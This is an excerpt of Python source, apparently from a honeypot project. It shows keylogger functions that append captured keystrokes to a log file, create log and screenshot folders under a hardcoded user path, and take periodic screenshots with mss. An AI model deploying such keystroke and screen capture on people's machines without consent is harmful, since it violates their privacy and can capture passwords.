...
def write_file(keys):                  #To write the keys to the Files
    with open("/Users/meghanavinjam/downloads/Honeypot-Implementation-master/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
...
class keylogger_main:
    ...
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists('/Users/meghanavinjam/downloads/Honeypot-Implementation-master/Keylogger'):
            os.mkdir('/Users/meghanavinjam/downloads/Honeypot-Implementation-master/Keylogger')
            os.mkdir('/Users/meghanavinjam/downloads/Honeypot-Implementation-master/Screenshots')
            os.mknod('/Users/meghanavinjam/downloads/Honeypot-Implementation-master/Keylogger/log.txt')
    ...
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='/Users/meghanavinjam/downloads/Honeypot-Implementation-master//Keylogger/Screenshots/{}.png'.format(time.time()))
